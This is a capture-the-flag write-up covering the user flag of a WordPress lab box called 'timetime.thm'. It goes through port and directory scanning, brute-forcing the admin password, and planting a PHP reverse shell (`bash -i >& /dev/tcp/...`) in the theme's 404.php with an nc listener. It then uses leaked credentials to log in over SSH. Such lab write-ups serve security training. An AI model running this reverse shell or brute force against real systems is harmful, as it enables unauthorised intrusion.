# CTF: Un Pepene

![Difficulty: Hard](https://img.shields.io/badge/difficulty-hard-%23ff0000)
![Contest Date: 2024-05-14](https://img.shields.io/badge/contest%20date-2024--05--14-informational)
![Category: FTP, Hash, Crontab, SSH Key](https://img.shields.io/badge/category-ftp,hash,crontab,sshkey-%237159c1)
![By: Alexandre](https://img.shields.io/badge/by-Alexandre-%23f9a03c)  
![alt text](img/silence.png)
## Description

> Efectuați un test de penetrare

## Write-up

UserFlag: user.txt  
RootFlag: root.txt

## Flag Solutions

### User Flag

First thing to do is to check open ports on the target machine. We can do this by running a port scan using `nmap`.

```bash
nmap -sSV $IP
```

Results : 
```bash
PORT   STATE SERVICE VERSION

22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)

80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))

MAC Address: 02:85:B5:9A:69:1F (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We have two open ports, 22 and 80. Let's check the web server on port 80.

```bash
http://$IP
```

We found default Debian Apache2 page. Let's check with a gobuster scan.

```bash
gobuster dir --url http://$IP -w /usr/share/wordlists/dirb/common.txt
```

Results : 
```bash
/blog (Status: 301)
```

We have to go to the blog directory.

```bash
http://$IP/blog
```

But we are redirected to an host `http://timetime.thm`. We can add the host to the `/etc/hosts` file.

```bash
echo "$IP timetime.thm" >> /etc/hosts
```

We have a blog page wordpress. We can wpscan to find vulnerabilities.

```bash
wpscan -e u --url http://<HOST>/blog

[i] User(s) Identified:

[+] admin
```

We have an admin user. We can try to bruteforce the password.

```bash
wpscan --url http://<HOST>/blog -U admin -P /usr/share/wordlists/rockyou.txt
```

We have the password for admin `admin`.

We can login to the wordpress admin page.

```bash
http://timetime.thm/blog/wp-admin
```

We can go to the `Appearance` tab and `Editor`. We can edit the `404.php` file and add a reverse shell.

```PHP
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/$IP/$PORT 0>&1'");
?>
```

We can start a listener on the attacker machine.

```bash
nc -lvnp $PORT
```

We can connect to the reverse shell.

```bash
http://timetime.thm/blog/index.php/404.php
```

We are connected to the reverse shell. After long search, we can find a file `wp-save.txt` in the `/opt` directory.

```bash
cat /opt/wp-save.txt
```

We have an user `squeezie` with a password. We can login with the user `squeezie` and the password we found.

```bash
ssh squeezie@$IP
```

We can find the user flag.

**Well done! You found the user flag!**
